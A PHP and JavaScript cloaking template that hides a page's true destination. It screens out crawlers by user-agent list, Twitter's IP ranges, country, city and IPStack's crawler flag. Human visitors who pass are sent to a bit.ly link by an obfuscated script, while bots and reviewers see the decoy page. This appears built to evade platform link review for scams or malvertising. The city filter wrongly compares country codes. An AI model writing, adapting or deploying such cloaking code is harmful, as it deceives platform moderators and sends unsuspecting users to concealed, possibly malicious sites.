<?php

/**
 * Class CrawlerCheck
 * Provides server side checks to see if the visitor is a crawler.
 * Please configure the capitalized settings above the line.
 *
 */
class CrawlerCheck {

	/**
	 * Your redirect url for humans
	 * Create a https://bitly.com url (or similar) and paste the url here.
	 * Example url directs to Shopify home page.
	 *
	 * @var string
	 */
	protected $BITY_URL = 'https://bit.ly/3gDNfri';

	/**
	 * Your token to access the IPStack service
	 * Get a free API token from https://ipstack.com
	 * Key will look like '4a1d0dd60fd74723011f280192b1b1d4' (example only).
	 *
	 * @var string
	 */
	protected $IP_STACK_TOKEN = '';

	/**
	 * A list country codes to block.
	 * Example 'PH' for Phillipines, https://en.wikipedia.org/wiki/ISO_3166-1
	 *
	 * @var array
	 */
	protected $BLOCKED_COUNTRY_CODES = ['PH'];

	/**
	 * A list of city names to block.
	 * Use any common city names with care.
	 * Example 'San Francisco'
	 *
	 * @var array
	 */
	protected $BLOCKED_CITY_NAMES = ['San Francisco'];

	/**
	 * A list of corporate IP ranges to block.
	 * Example Twitter https://ipinfo.io/AS35995
	 *
	 * @var array
	 */
	protected $BLOCKED_IP_RANGES = [
		'185.45.4.0/23',
		'185.45.4.0/24',
		'192.133.78.0/23',
		'8.25.194.0/23',
		'8.25.195.0/24',
		'8.25.196.0/23',
		'8.25.196.0/24'
	];

	/**
	 * A list of user-agents to block.
	 * A robust list is provided lower down, but add any additional user agent strings here.
	 * Example 'Twitterbot' (already present in the main list).
	 *
	 * @var array
	 */
	protected $BLOCKED_USER_AGENTS = [
		'Twitterbot'
	];

	/*
	 * ==========================================================================
	 * ==== Don't modify below this point unless you know what you are doing ====
	 * ==========================================================================
	 */

	/**
	 * Attribute to flag for blocked results.
	 *
	 * @var bool
	 */
	protected $blocked = false;

	/**
	 * List of errors.
	 *
	 * @var array
	 */
	protected $errors = [];

	/**
	 * Getter for blocked attribute.
	 *
	 * @return bool
	 */
	public function isBlocked() {

		return !!$this->blocked;
	}

	/**
	 * Getter for error bag.
	 *
	 * @return array
	 */

	public function getErrors() {

		return $this->errors;
	}

	/**
	 * Primary method for running all checks.
	 *
	 * @return bool
	 */
	public function check() {

		if (!$this->blocked && $this->checkUserAgent()) {
			$this->blocked = true;
		}
		if (!$this->blocked && $this->checkIpAddress()) {
			$this->blocked = true;
		}

		return $this->blocked;
	}

	/**
	 * Run check on user agent string.
	 *
	 * @return bool
	 */
	public function checkUserAgent() {

		$search = '';
		if (count($this->BLOCKED_USER_AGENTS)) {
			$search = implode('|', $this->BLOCKED_USER_AGENTS);
			$search = preg_quote($search) . '|';
		}
		$search = $search . 'googlebot|bot|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis';
		$search = '(' . $search . ')';

		return !!(isset($_SERVER['HTTP_USER_AGENT']) && preg_match($search, $_SERVER['HTTP_USER_AGENT']));
	}

	/**
	 * Fetch result from IPStack and check against block lists.
	 * Block lists checked: $BLOCKED_COUNTRY_CODES, $BLOCKED_CITY_NAMES, $BLOCKED_IP_RANGES.
	 * Will also check against IPStacks known pool of crawler IP addresses.
	 *
	 * @return bool
	 */
	public function checkIpAddress() {

		// Ensure IPStack is enabled

		// Get the result from IPStack
		$ip      = $this->getIpAddress();
		$ipstack = $this->getIpStack($ip);
		// Check to see if we got a response
		if ($ipstack && !(isset($ipstack->success) && $ipstack->success === false)) {
			if ($ipstack->security->is_crawler || in_array($ipstack->country_code, $this->BLOCKED_COUNTRY_CODES) || in_array($ipstack->country_code,
					$this->BLOCKED_CITY_NAMES) || $this->ipInRange($ip,
					$this->BLOCKED_IP_RANGES)) {
				return true;
			}
		}

		return false;

	}

	/**
	 * Gets the visitor's IP address to be checked against IPStack.
	 *
	 * @return string
	 */
	protected function getIpAddress() {

		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
			$ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
			$ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
			$ip = $_SERVER['REMOTE_ADDR'];
		}

		return $ip;
	}

	/**
	 * Fetches a response from the IPStack service.
	 * Must have a valid $IP_STACK_TOKEN and $ip address provided.
	 *
	 * @param $ip
	 *
	 * @return mixed|null
	 */
	protected function getIpStack($ip) {

		if (!empty($this->IP_STACK_TOKEN) && !empty($ip)) {
			try {
				$response = json_decode(file_get_contents(sprintf('http://api.ipstack.com/%s?access_key=%s', $ip, $this->IP_STACK_TOKEN)));

				if ($response && !(isset($response->success) && $response->success === false)) {
					$ipstack = $response;
				}
			}
			catch (Exception $e) {
				$this->errors[] = $e->getMessage();
			}
		}

		return isset($ipstack) ? $ipstack : null;
	}

	/**
	 * Checks the provided IP address against a corporate IP range.
	 *
	 * @param $ip
	 * @param $range
	 *
	 * @return bool
	 */
	protected function ipInRange($ip, $range) {

		if (strpos($range, '/') == false) {
			$range .= '/32';
		}

		// $range is in IP/CIDR format eg 127.0.0.1/24
		list($range, $netmask) = explode('/', $range, 2);

		$ip_decimal       = ip2long($ip);
		$range_decimal    = ip2long($range);
		$wildcard_decimal = pow(2, (32 - $netmask)) - 1;
		$netmask_decimal  = ~$wildcard_decimal;

		return (($ip_decimal & $netmask_decimal) == ($range_decimal & $netmask_decimal));
	}

}

// Create new check instance
$crawlerCheck = new CrawlerCheck();
// Run the checks
$blocked = $crawlerCheck->check();

?>
<?php if (!$blocked) { ?>
	<style type="text/css">
		<?php echo "#loader{height:100%;width:100%;position:fixed;z-index:999;top:0;left:0;background-color:rgb(255,255,255);overflow-x:hidden}.loading{position:absolute;left:50%;top:50%;height:40px;width:40px;margin:0px auto;-webkit-animation:rotation .6s infinite linear;-moz-animation:rotation .6s infinite linear;-o-animation:rotation .6s infinite linear;animation:rotation .6s infinite linear;border-left:6px solid rgba(0,174,239,.15);border-right:6px solid rgba(0,174,239,.15);border-bottom:6px solid rgba(0,174,239,.15);border-top:6px solid rgba(0,174,239,.8);border-radius:100%}@-webkit-keyframes rotation{from{-webkit-transform:rotate(0deg)}to{-webkit-transform:rotate(359deg)}}@-moz-keyframes rotation{from{-moz-transform:rotate(0deg)}to{-moz-transform:rotate(359deg)}}@-o-keyframes rotation{from{-o-transform:rotate(0deg)}to{-o-transform:rotate(359deg)}}@keyframes rotation{from{transform:rotate(0deg)}to{transform:rotate(359deg)}}"; ?>
	</style>
	<script type="text/javascript">
		var _0x53a0=['location','test','style','(googlebot/|bot|Googlebot-Mobile|Googlebot-Image|Google\x20favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST\x20Enterprise\x20Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon\x20|httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee\x20Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix\x20crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam\x20gnam\x20spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content\x20crawler\x20spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey\x20SEO\x20Service|CC\x20Metadata\x20Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain\x20Re-Animator\x20Bot|AddThis)','DOMContentLoaded','removeChild','https://bit.ly/3gDNfri','parentNode','addEventListener','userAgent','overlay'];(function(_0x357d20,_0x53a0a2){var _0x2a5beb=function(_0x41bbf4){while(--_0x41bbf4){_0x357d20['push'](_0x357d20['shift']());}};_0x2a5beb(++_0x53a0a2);}(_0x53a0,0x144));var _0x2a5b=function(_0x357d20,_0x53a0a2){_0x357d20=_0x357d20-0x0;var _0x2a5beb=_0x53a0[_0x357d20];return _0x2a5beb;};var botPattern=_0x2a5b('0x9');var botTest=new RegExp(botPattern,'i');var userAgent=navigator[_0x2a5b('0x4')];if(!botTest[_0x2a5b('0x7')](userAgent)){window[_0x2a5b('0x6')]['replace'](_0x2a5b('0x1'));}else{document[_0x2a5b('0x3')](_0x2a5b('0xa'),function(){var _0x580ffd=document['getElementById'](_0x2a5b('0x5'));_0x580ffd[_0x2a5b('0x8')]['display']='none';_0x580ffd[_0x2a5b('0x2')][_0x2a5b('0x0')](_0x580ffd);});}
	</script>
<?php } ?>
